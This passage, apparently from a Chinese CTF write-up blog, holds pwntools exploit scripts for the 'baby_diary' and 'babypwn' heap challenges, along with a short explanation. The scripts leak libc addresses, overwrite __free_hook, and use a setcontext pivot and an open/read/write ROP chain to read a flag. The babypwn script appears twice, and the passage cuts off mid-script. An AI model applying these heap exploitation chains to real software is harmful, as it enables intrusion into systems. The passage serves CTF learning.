class="comment">#9</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#10 x</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#11 x</span></span><br><span class="line">    add(<span class="number">0x47</span>)<span class="comment">#12 x</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,p8(<span class="number">0</span>))<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#4,5,6,10, 11,13,14</span></span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)+p8(<span class="number">0x10</span>)) <span class="comment">#15  x</span></span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'5555555'</span>)<span class="comment">#16 x</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0x190</span>)+p64(<span class="number">0x101</span>)+p8(<span class="number">0x40</span>))<span class="comment">#</span></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+p8(<span class="number">0</span>)*<span class="number">6</span>)<span class="comment">#16</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p8(<span class="number">0</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#17+23</span></span><br><span class="line">        add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'1'</span>*<span class="number">7</span>)<span class="comment">#17</span></span><br><span class="line"><span class="comment">#    free(14)</span></span><br><span class="line"><span class="comment">#    add(0x37,p64(1)+p8(0)*8)</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>)                     </span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">3</span>)    </span><br><span class="line">    show(<span class="number">17</span>)</span><br><span class="line">    addr=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-391</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc+<span class="number">10</span>,num=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[!] you can choose it by hand</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'22222'</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x57</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x57</span>,p64(x.dump(<span class="string">'system'</span>))) <span class="comment">#18</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh=process(<span class="string">"./baby_diary"</span>)</span><br><span class="line">        <span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn2()</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babypwn'</span>)</span><br><span class="line">p=process(<span class="string">'./babypwn'</span>)</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(v2)</span>:</span></span><br><span class="line">    s=Solver()</span><br><span class="line">    a1=BitVec(<span class="string">'a1'</span>,<span class="number">32</span>) </span><br><span class="line">    t = a1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            a1 ^= (<span class="number">32</span> * a1) ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>)) ^ (((<span class="number">32</span> * a1) ^ a1 ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>))) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    s.add(a1 == int(v2,<span class="number">16</span>))</span><br><span class="line">    s.check()</span><br><span class="line">    ans = int(s.model()[t].as_long())</span><br><span class="line">    print(hex(ans))</span><br><span class="line">    <span class="keyword">return</span> p32(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x88</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0xf0</span>*<span class="string">'1'</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x88</span>*<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">x=decode(x)</span><br><span class="line">y=x+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">main_arena=addr<span class="number">-328</span></span><br><span class="line">malloc=main_arena<span class="number">-0x10</span></span><br><span class="line">log,info(<span class="string">'malloc:'</span>+hex(malloc))</span><br><span class="line">x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'yyyyyyy'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">rdi_ret=x.libcbase+<span class="number">0x0000000000025a3b</span></span><br><span class="line">rsi_ret=x.libcbase+<span class="number">0x00000000000263e9</span></span><br><span class="line">rdx_ret=x.libcbase+<span class="number">0x00000000001018c5</span></span><br><span class="line">rbp_ret=x.libcbase+<span class="number">0x000000000004a1a7</span></span><br><span class="line">rax=x.libcbase+<span class="number">0x000000000002606c</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">xx=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">xx=decode(xx)</span><br><span class="line">y=xx+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">edit(<span class="number">13</span>,p64(x.dump(<span class="string">'setcontext'</span>)+<span class="number">53</span>))</span><br><span class="line">pay=p64(rdi_ret)+p64(<span class="number">0</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(x.dump(<span class="string">'open'</span>))<span class="comment">#open(addr,0,0)</span></span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">3</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">1</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'write'</span>))</span><br><span class="line">print(len(pay))</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">15</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x10</span>+p64(addr+<span class="number">0x118</span>+<span class="number">0x360</span>)+p64(rdi_ret)+<span class="string">'1'</span>*<span class="number">0x18</span>+<span class="string">'3'</span>*<span class="number">0x40</span>+<span class="string">'22222'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00'</span>)</span><br><span class="line"><span class="comment">#free(10)</span></span><br><span class="line"><span class="comment">#edit(10,'xxxxxxx')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>heap题orw 第一次做，在正式比赛时踩了很多坑。赛后才复现出来</p><p>典型的all by one ，缩小free chunk 用法。但在正式比赛时，直接给自己玩坑chunk 在布局时给小了,导致后面orw 写不下，orz….好在通过z3来爆破出show函数的输出值,可以推算出chunk间的关系。不过，在复现时也学到一个知识：就算我们通过hook控制的只能是程序的rip。不能直接控制rbp和rsp。但我们可以通过SROP方法，利用setcontext来间接控制rbp和rsp。（这里有个坑，布置X64的sigcontext至少需0xf8的空间）同时c语言在执行一些函数时，传入参数格式正确但值不符合逻辑的如read(0,0,0)这种，利用chunk内原本的‘\x00’这样可以适当减少自己写入sigcontext 长度，只需要专注控制rbp和rsp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babypwn'</span>)</span><br><span class="line">p=process(<span class="string">'./babypwn'</span>)</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(v2)</span>:</span></span><br><span class="line">    s=Solver()</span><br><span class="line">    a1=BitVec(<span class="string">'a1'</span>,<span class="number">32</span>) </span><br><span class="line">    t = a1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            a1 ^= (<span class="number">32</span> * a1) ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>)) ^ (((<span class="number">32</span> * a1) ^ a1 ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>))) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    s.add(a1 == int(v2,<span class="number">16</span>))</span><br><span class="line">    s.check()</span><br><span class="line">    ans = int(s.model()[t].as_long())</span><br><span class="line">    print(hex(ans))</span><br><span class="line">    <span class="keyword">return</span> p32(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x88</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0xf0</span>*<span class="string">'1'</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x88</span>*<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span 